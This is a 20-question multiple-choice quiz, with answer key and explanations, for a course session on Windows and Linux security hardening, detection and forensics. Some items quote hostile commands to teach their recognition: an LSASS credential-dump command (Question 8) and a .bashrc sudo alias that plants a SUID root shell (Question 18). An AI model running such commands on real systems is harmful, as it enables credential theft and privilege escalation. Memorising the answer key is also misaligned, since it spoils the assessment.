# Final Quiz — Session 12: OS Security (Windows and Linux)

**Instructions:** Choose the single best answer for each question.
This is the formal assessment for Session 12.
Time allowed: 30 minutes.

---

**Question 1:** What is User Account Control (UAC) in Windows?

A) A feature that blocks all internet access for standard user accounts
B) A mechanism that prompts users when a process tries to elevate to higher privileges
C) A tool for managing user passwords and account expiration
D) A firewall rule that restricts users from running applications

**Correct Answer: B**

---

**Question 2:** Which Windows Event ID indicates a successful user logon?

A) 4625
B) 4688
C) 4624
D) 1102

**Correct Answer: C**

---

**Question 3:** An attacker places a malicious script in `/etc/cron.d/` that runs every minute as root.
What type of persistence mechanism is this?

A) Scheduled task
B) Registry Run key
C) Cron job
D) Systemd service

**Correct Answer: C**

---

**Question 4:** What does `find / -perm -4000 -type f 2>/dev/null` do on Linux?

A) Finds all files owned by root
B) Finds all files that are world-readable
C) Finds all files with the SUID bit set
D) Finds all recently modified configuration files

**Correct Answer: C**

---

**Question 5:** Which of the following is a reason to disable SMBv1 on Windows?

A) SMBv1 uses too much network bandwidth
B) SMBv1 is vulnerable to EternalBlue (CVE-2017-0144), exploited in WannaCry ransomware
C) SMBv1 requires a separate license from Microsoft
D) SMBv1 does not support file sharing over the network

**Correct Answer: B**

---

**Question 6:** In Linux, what does the `auditd` daemon provide?

A) Automatic software updates
B) Kernel-level audit logging of system calls, file access, and user actions
C) Network traffic analysis and intrusion detection
D) System performance monitoring and resource alerts

**Correct Answer: B**

---

**Question 7:** An attacker installs a library in `/etc/ld.so.preload`.
What is the likely purpose?

A) To speed up application startup by preloading common libraries
B) To install a rootkit that intercepts system calls and hides attacker activity
C) To create a backup of critical system libraries
D) To enable debugging of system processes

**Correct Answer: B**

---

**Question 8:** Which of the following MITRE ATT&CK techniques does `rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump 624 lsass.dmp full` represent?

A) T1547.001 — Registry Run Keys
B) T1003.001 — OS Credential Dumping: LSASS Memory
C) T1059.001 — PowerShell
D) T1543.003 — Windows Service

**Correct Answer: B** — This is the comsvcs.dll LOLBin technique for dumping LSASS memory, which contains credential hashes.

---

**Question 9:** What is the effect of setting `net.ipv4.ip_forward = 1` on a Linux server that is NOT intended to be a router?

A) It enables IPv6 forwarding between interfaces
B) It allows the server to forward network packets between interfaces, potentially creating a pivot point for attackers
C) It increases TCP connection throughput
D) It enables the server to receive broadcast packets

**Correct Answer: B**

---

**Question 10:** An analyst observes Windows Event ID 4648 with `TargetUserName = svc_backup` and `TargetServerName = FS-CORP-01`.
What does this indicate?

A) The account `svc_backup` failed to log in to `FS-CORP-01`
B) An explicit credential logon was attempted — a process used specific credentials to connect to `FS-CORP-01` as `svc_backup`
C) The password for `svc_backup` was changed on `FS-CORP-01`
D) The account `svc_backup` was created on `FS-CORP-01`

**Correct Answer: B** — Event ID 4648 is "A logon was attempted using explicit credentials" — typically seen in pass-the-hash or credential relay attacks.

---

**Question 11:** Which of the following correctly describes the relationship between `mtime` and `ctime` in Linux forensics?

A) `mtime` records metadata changes; `ctime` records content changes
B) Both `mtime` and `ctime` can be freely modified by any file owner using `touch`
C) `mtime` records when file content was last modified; `ctime` records when the inode metadata last changed and cannot be manipulated by normal user-space tools
D) `ctime` is always later than `mtime` by design

**Correct Answer: C** — This distinction is critical for detecting timestomping.
Attackers can backdate `mtime` with `touch -t`, but `ctime` updates whenever metadata changes and cannot be backdated through normal operations.

---

**Question 12:** What does enabling `WDigest` authentication (`UseLogonCredential = 1`) on Windows cause?

A) WDigest enables two-factor authentication for domain accounts
B) WDigest stores plaintext (or reversibly encrypted) passwords in LSASS memory, available to attackers who dump credentials
C) WDigest encrypts all network traffic using digest algorithms
D) WDigest creates a digital signature for all user logon events

**Correct Answer: B**

---

**Question 13:** A Linux web server running as `www-data` (UID 33) makes an outbound TCP connection to port 4444 on an external IP.
What is this most likely?

A) A legitimate content delivery network connection
B) A reverse shell callback to an attacker's command-and-control server
C) A database replication connection to a backup server
D) An NTP time synchronization request

**Correct Answer: B** — Port 4444 is the default Metasploit/Netcat reverse shell port.
A web process making outbound connections to random external IPs is highly suspicious.

---

**Question 14:** Which of the following is the correct SELinux mode for enforcing security policy without blocking access?

A) Enforcing
B) Permissive
C) Disabled
D) Auditing

**Correct Answer: B** — In Permissive mode, SELinux logs policy violations but does not block them.
This is used for testing policy before enforcement.
Enforcing mode blocks violations.

---

**Question 15:** An analyst runs `ps aux` and sees a process with `(deleted)` shown in the command line: `/tmp/.implant (deleted)`.
What does this mean?

A) The process crashed and is in a zombie state
B) The process's executable binary was deleted from disk while the process was still running
C) The process has been marked for deletion by the OS
D) The process log file was deleted

**Correct Answer: B** — This is a classic anti-forensic technique: the attacker launches the binary then deletes it from disk.
The process continues running because the OS keeps the file open.
The binary can be recovered from `/proc/<PID>/exe`.

---

**Question 16:** Which CIS Benchmark Level 1 control requires disabling the Print Spooler service on non-print servers?

A) CIS 1.1.5
B) CIS 18.3.3
C) CIS 18.9.59
D) CIS 2.3.11.4

**Correct Answer: C** — CIS 18.9.59 addresses Print Spooler.
This became critical after PrintNightmare (CVE-2021-34527).
CIS 1.1.5 = min password length; 18.3.3 = SMBv1; 2.3.11.4 = LSASS Protection.

---

**Question 17:** What is the primary forensic significance of the Windows Prefetch directory (`C:\Windows\Prefetch\`)?

A) It stores compressed backup copies of recently accessed files
B) It contains metadata about recently executed programs, including last run time and files accessed — even if the executable has been deleted
C) It stores temporary internet files for the Windows browser
D) It holds pending Windows Update files before installation

**Correct Answer: B** — Prefetch files record executable metadata (name, hash, run times, files/directories accessed).
They are valuable in forensics because they prove an executable ran even after it has been deleted.

---

**Question 18:** During a Linux IR, you find `/home/user/.bashrc` contains: `alias sudo='sudo bash -c "cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash" && sudo'`.
What is this?

A) A legitimate sudo alias for faster command execution
B) A persistence and privilege escalation trap: when the user runs `sudo`, it silently creates a SUID root bash copy before executing the normal sudo
C) A broken alias that prevents sudo from working
D) A log redirection command that writes sudo activity to /tmp

**Correct Answer: B** — This is a .bashrc-based persistence and privilege escalation trojan.
The alias intercepts every `sudo` call, creates a SUID bash binary at `/tmp/rootbash`, and then executes the real sudo.
Running `/tmp/rootbash -p` later gives a root shell.
This is T1037 (Boot/Logon Initialization Scripts) + T1548.001 (SUID).

---

**Question 19:** An organization wants to prevent lateral movement via Pass-the-Hash attacks in their Windows environment.
Which combination of controls is MOST effective?

A) Enabling Windows Firewall and antivirus on all endpoints
B) Disabling WDigest, enabling LSA Protection (RunAsPPL), using Credential Guard, and restricting NTLM usage
C) Requiring complex passwords with 8+ characters and 90-day rotation
D) Implementing software restriction policies and AppLocker

**Correct Answer: B** — PtH specifically requires NTLM hashes in memory.
Disabling WDigest prevents plaintext creds; RunAsPPL protects LSASS from dumping; Credential Guard virtualizes credentials so they cannot be extracted; restricting NTLM forces Kerberos where possible.

---

**Question 20:** A forensic examiner acquires a disk image and records its SHA256 hash.
Why is this step critical?

A) SHA256 hashing improves the read speed of large disk images
B) The hash proves the evidence was not modified after acquisition — establishing integrity for legal admissibility
C) SHA256 encryption prevents unauthorized access to the disk image
D) The hash is required by forensic software to mount the image

**Correct Answer: B** — Chain of custody and evidence integrity require that the forensic copy's hash be verified before and after analysis.
If the hash changes, the evidence is inadmissible and the investigation is compromised.
